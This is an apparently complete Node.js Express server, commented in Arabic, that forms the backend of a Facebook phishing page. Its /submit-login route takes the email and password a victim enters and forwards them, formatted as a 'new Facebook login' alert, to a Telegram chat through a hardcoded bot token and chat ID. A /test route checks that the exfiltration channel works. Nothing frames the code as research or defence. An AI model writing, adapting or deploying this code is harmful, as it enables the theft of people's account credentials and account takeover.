const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات تيلجرام ==========
const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
const TELEGRAM_CHAT_ID = '8140097273';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== دالة إرسال فورية ==========
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            console.log('✅ تم الإرسال');
        } else {
            console.error('❌ فشل:', await response.text());
        }
    } catch (e) {
        console.error('❌ خطأ:', e.message);
    }
}

app.get('/test', async (req, res) => {
    await sendTelegramMessage('✅ <b>البوت شغال!</b> 🎉');
    res.send('✅ تم إرسال رسالة اختبار');
});

// ========== مسار تسجيل الدخول ==========
app.post('/submit-login', async (req, res) => {
    try {
        const { email, password } = req.body;
        console.log('📥 استلام بيانات:', email, password);
        
        let msg = `📘 <b>تسجيل دخول جديد - Facebook</b>\n`;
        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        msg += `📧 <b>البريد / الهاتف:</b> ${email}\n`;
        msg += `🔐 <b>كلمة المرور:</b> ${password}\n\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
    console.log(`📱 اختبار: http://localhost:${PORT}/test`);
});
